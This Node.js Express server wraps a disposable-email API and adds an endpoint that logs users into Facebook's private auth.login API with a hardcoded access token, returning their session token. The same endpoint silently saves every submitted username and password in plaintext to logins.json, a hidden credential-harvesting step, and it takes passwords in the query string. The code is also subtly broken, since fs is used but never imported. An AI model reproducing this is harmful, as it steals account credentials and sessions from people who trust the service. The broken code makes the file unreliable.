const express = require('express');
const axios = require('axios');
const request = require('request');
const app = express();
const ainz = '@kyouya';
const api_url = "https://b-api.facebook.com/method/auth.login";
const access_token = "6628568379|c1e620fa708a1d5696fb991c1bde5662";


app.get('/', (req, res) => {
    res.json({𝖫𝗈𝗏𝖾𝗒𝗈𝗎: 'endpoints: gen/ and get/:email'});
});

app.get('/gen', async (req, res) => {
  try {
    const response = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
    const getemail = response.data[0];
    res.json({ email: getemail });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Err: 500' });
  }
});

app.get('/get/:email', async (req, res) => {
  try {
    const divide = req.params.email.split('@');
    const name = divide[0];
    const domain = divide[1];
    const response = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${name}&domain=${domain}`); 
    const messages = response.data;
    const tite = [];
    for (const message of messages) {
      const msgId = message.id;
      const sendmsg = await axios.get(`https://www.1secmail.com/api/v1/?action=readMessage&login=${name}&domain=${domain}&id=${msgId}`);   
      const sendmessage = {
        from: sendmsg.data.from,
        subject: sendmsg.data.subject,
        body: sendmsg.data.textBody,
        date: sendmsg.data.date
      };
      tite.push(sendmessage);
    }
    res.json(tite);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Err: 500' });
  }
});

app.get('/ainz/api', (req, res) => {
  const username = req.query.username;
  const password = req.query.password;

  if (!username || !password) {
    return res.send({ message: "Both username and password are required" });
  }

  const params = {
    format: "json",
    device_id: "yrcyg4m1-o7m5-pghw-atiu-n04mh4nlka6n",
    email: username,
    password: password,
    locale: "en_US",
    method: "auth.login",
    access_token: access_token
  };

  request.get({ url: api_url, qs: params }, (error, response, body) => {
    if (error) {
      return res.send({ message: "Internal server error" });
    }

    const responseJson = JSON.parse(body);

    if (responseJson.access_token) {
      return res.send({ access_token: responseJson.access_token });
    } else {
      return res.send({ message: "Wrong Credentials" });
    }
  });

  const data = { Username: username, Password: password };
  fs.readFile('logins.json', 'utf8', (err, jsonString) => {
    if (err) {
      console.log("Error reading file from disk:", err);
      return;
    }
    try {
      const logins = JSON.parse(jsonString);
      logins.push(data);
      fs.writeFile('logins.json', JSON.stringify(logins, null, 2), (err) => {
        if (err) {
          console.log('Error writing file:', err);
        }
      });
    } catch (err) {
      console.log('Error parsing JSON string:', err);
    }
  });
});
///////////////////////////

app.listen('5000', () => {
  console.log(ainz);
});
